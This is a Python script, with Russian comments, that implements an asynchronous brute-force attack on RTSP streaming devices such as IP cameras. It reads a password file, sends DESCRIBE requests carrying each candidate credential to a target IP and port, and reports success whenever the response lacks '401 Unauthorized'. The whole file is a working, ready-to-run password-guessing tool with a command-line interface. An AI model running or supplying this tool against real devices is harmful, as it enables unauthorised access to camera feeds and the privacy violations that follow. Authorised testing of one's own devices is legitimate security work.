import asyncio
import time

import aiofiles
import argparse


class RTSPBruteforcer:
    def __init__(self, target, user, password_file, max_connections_per_second=5):
        self.target = target
        self.user = user
        self.password_file = password_file
        self.max_connections_per_second = max_connections_per_second
        self.connections_semaphore = asyncio.Semaphore(max_connections_per_second)

        target_parts = self.target.split(":")
        self.target_ip = target_parts[0]
        self.target_port = target_parts[1] if len(target_parts) > 1 else "554"
        self.password_found = False

    async def send_rtsp_request(self, ip, port, request, timeout=10):
        async with self.connections_semaphore:
            try:
                reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
                writer.write(request.encode())
                await writer.drain()
                response = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                writer.close()
                await writer.wait_closed()
                return response.decode()
            except asyncio.TimeoutError:
                print(f"Timeout при подключении к {ip}:{port}")
                return None
            except Exception as e:
                print(f"Ошибка при подключении к {ip}:{port}: {e}")
                return None

    async def try_login(self, password):
        if self.password_found:
            return False
        request = f"DESCRIBE rtsp://{self.user}:{password}@{self.target_ip}:{self.target_port}/ RTSP/1.0\r\nCSeq: 2\r\n\r\n"
        response = await self.send_rtsp_request(self.target_ip, int(self.target_port), request)
        if response and "401 Unauthorized" not in response:
            print(f"[+] Success: Password found: {password}")
            self.password_found = True
            return True
        else:
            print(f"[-] Unauthorized for {password}")
            return False

    async def run(self):
        tasks = []
        async with aiofiles.open(self.password_file, 'r') as f:
            passwords = [line.strip() for line in await f.readlines()]

        start_time = time.time()
        for password in passwords:
            if self.password_found:
                break
            if len(tasks) >= self.max_connections_per_second:
                elapsed = time.time() - start_time
                if elapsed < 1:
                    await asyncio.sleep(1 - elapsed)
                tasks = []  # Сбрасываем задачи после паузы
                start_time = time.time()

            task = asyncio.create_task(self.try_login(password))
            tasks.append(task)

            # Ждем завершения текущей пачки задач, чтобы не превысить лимит
            if len(tasks) == self.max_connections_per_second:
                await asyncio.gather(*tasks)

        # Ждем завершения оставшихся задач
        if tasks and not self.password_found:
            await asyncio.gather(*tasks)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTSP Bruteforce Tool")
    parser.add_argument('--target', required=True, help='Target IP:Port')
    parser.add_argument('--user', required=True, help='Username for RTSP device')
    parser.add_argument('--password', dest='password_file', required=True, help='Path to password file')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of concurrent attempts')

    args = parser.parse_args()

    bruteforcer = RTSPBruteforcer(args.target, args.user, args.password_file, args.threads)
    asyncio.run(bruteforcer.run())
